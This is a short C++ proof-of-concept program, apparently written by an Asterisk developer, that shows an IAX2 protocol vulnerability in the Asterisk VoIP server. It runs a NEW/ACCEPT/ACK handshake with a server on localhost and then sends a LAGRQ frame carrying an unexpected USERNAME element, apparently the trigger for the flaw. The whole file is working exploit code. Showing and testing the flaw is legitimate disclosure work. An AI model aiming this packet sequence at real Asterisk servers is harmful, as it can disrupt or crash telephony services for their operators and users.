/*
 * Copyright (C) 2007, Russell Bryant <russell@digium.com> 
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 */

/*!
 * \file
 * \author Russell Bryant <russell@digium.com>
 *
 * \brief App to demonstrate Asterisk IAX2 vulnerability
 */

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

using namespace std;

#include "iax2/iax2_frame.h"
#include "iax2/iax2_peer.h"

unsigned char pkt_buf[4096];
unsigned char large_audio_buf[8192];

int main(int argc, char *argv[])
{
	int sockfd;
	struct sockaddr_in local_addr;
	struct sockaddr_in remote_addr;
	const char *remote_ip = "127.0.0.1";
	size_t res;
	socklen_t addr_len = sizeof(remote_addr);

	memset(&local_addr, 0, sizeof(local_addr));
	local_addr.sin_family = AF_INET;
	local_addr.sin_port = htons(DEFAULT_IAX2_PORT + 1);

	memset(&remote_addr, 0, sizeof(remote_addr));
	remote_addr.sin_family = AF_INET;
	remote_addr.sin_port = htons(DEFAULT_IAX2_PORT);
	if (!inet_aton(remote_ip, &remote_addr.sin_addr)) {
		printf("%s isn't a valid IP addr\n", remote_ip);
		exit(1);
	}

	if ((sockfd = socket(PF_INET, SOCK_DGRAM, 0)) == -1) {
		printf("Unable to create socket: %s\n", strerror(errno));
		exit(1);
	}
	
	if (bind(sockfd, (struct sockaddr *) &local_addr, sizeof(local_addr))) {
		printf("Unable to bind socket to port '%d': %s\n", ntohs(local_addr.sin_port), strerror(errno));
		return -1;
	}

	iax2_frame frame_new;
	frame_new.set_direction(IAX2_DIRECTION_OUT).set_shell(IAX2_FRAME_FULL). \
		set_type(IAX2_FRAME_TYPE_IAX2).set_subclass(IAX2_SUBCLASS_NEW). \
		set_in_seq_num(0).set_out_seq_num(0). \
		set_source_call_num(1).add_ie_unsigned_short(IAX2_IE_VERSION, 2). \
		add_ie_unsigned_long(IAX2_IE_CAPABILITY, IAX2_FORMAT_ULAW). \
		add_ie_unsigned_long(IAX2_IE_FORMAT, IAX2_FORMAT_ULAW). \
		add_ie_string(IAX2_IE_USERNAME, "hi");

	if (frame_new.send(&remote_addr, sockfd)) {
		printf("Failed to send NEW\n");
		exit(1);
	}

	res = recvfrom(sockfd, pkt_buf, sizeof(pkt_buf), 0, (struct sockaddr *) &remote_addr, &addr_len);
	if (res == -1) {
		printf("recvfrom failed\n");
		exit(1);
	}

	iax2_frame frame_accept = iax2_frame(pkt_buf, res);
	if (frame_accept.get_type() != IAX2_FRAME_TYPE_IAX2) {
		printf("Did not receive ACCEPT\n");
		exit(1);
	}

	uint16_t remote_call_num = frame_accept.get_source_call_num();

	iax2_frame frame_ack;
	frame_ack.set_direction(IAX2_DIRECTION_OUT).set_shell(IAX2_FRAME_FULL). \
		set_type(IAX2_FRAME_TYPE_IAX2).set_subclass(IAX2_SUBCLASS_ACK). \
		set_in_seq_num(1).set_out_seq_num(1). \
		set_source_call_num(1).set_dest_call_num(remote_call_num);

	if (frame_ack.send(&remote_addr, sockfd)) {
		printf("Failed to send ACK\n");
		exit(1);
	}

	iax2_frame frame_lagrq;
	frame_lagrq.set_direction(IAX2_DIRECTION_OUT).set_shell(IAX2_FRAME_FULL). \
		set_type(IAX2_FRAME_TYPE_IAX2).set_subclass(IAX2_SUBCLASS_LAGRQ). \
		set_in_seq_num(1).set_out_seq_num(1). \
		set_source_call_num(1).set_dest_call_num(remote_call_num). \
		add_ie_string(IAX2_IE_USERNAME, "whocares");

	if (frame_lagrq.send(&remote_addr, sockfd)) {
		printf("Failed to send LAGRQ\n");
		exit(1);
	}

	exit(0);
}
